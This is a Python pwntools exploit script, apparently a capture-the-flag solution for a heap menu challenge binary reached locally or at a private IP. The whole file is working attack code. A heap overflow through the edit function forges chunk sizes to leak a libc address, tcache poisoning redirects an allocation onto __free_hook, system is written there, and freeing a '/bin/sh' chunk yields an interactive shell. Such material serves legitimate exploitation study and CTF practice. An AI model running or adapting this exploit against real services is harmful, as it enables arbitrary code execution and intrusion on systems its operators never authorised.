#!/usr/bin/env python3
# Local Ubuntu 20.04

from pwn import *

context(os='linux', arch='amd64')  
#context.log_level = 'debug'

BINARY = "./chal"
elf  = ELF(BINARY, checksec=False)

def Connect():
  if len(sys.argv) > 1 and sys.argv[1] == 'r':
    HOST = "172.31.3.2"
    PORT = 4241
    s = remote(HOST, PORT)
  else:
    s = process(BINARY)
  return s

def Add(idx, size):
  s.sendlineafter(b"> ", b"1")
  s.sendlineafter(b"index > ", str(idx).encode())  
  s.sendlineafter(b"size > ", str(size).encode())  

def Delete(idx):
  s.sendlineafter(b"> ", b"2")
  s.sendlineafter(b"index > ", str(idx).encode()) 

def Edit(idx, size, data):
  s.sendlineafter(b"> ", b"3")
  s.sendlineafter(b"index > ", str(idx).encode())  
  s.sendlineafter(b"size > ", str(size).encode()) 
  s.sendlineafter(b"content > ", data) 

def View(idx):
  s.sendlineafter(b"> ", b"4")
  s.sendlineafter(b"index > ", str(idx).encode()) 

def Exit():
  s.sendlineafter(b"> ", b"5")

s = Connect()

Add(0, 0x20)
Add(1, 0x20)
Add(2, 0x200)
Add(3, 0x200)

# libc leak
Edit(3, 0x200, (p64(0)+p64(0x11))*0x1f)
Edit(0, 0x30, b"A"*0x28+p64(0x421))
Delete(1)
Add(4, 0x20)
View(2)
libc_leak = u64(s.recvn(8))
libc_base = libc_leak - (0x7ffff7fc3be0-0x7ffff7dd7000)
print("libc_leak =", hex(libc_leak))
print("libc_base =", hex(libc_base))

# tcache poisoning
libc = elf.libc
free_hook = libc_base + libc.sym.__free_hook
Add(5, 0x20)
Edit(4, 0x31, b"A"*0x28+p64(0x211))
Delete(3)
Delete(2)
Edit(4, 0x39, b"A"*0x28+p64(0x211)+p64(free_hook))

# write system in __free_hook
system_addr = libc_base + libc.sym.system
Add(6, 0x200)
Add(7, 0x200)
Edit(7, 9, p64(system_addr))

Edit(6, 9, b"/bin/sh\x00")
Delete(6)
s.interactive()  
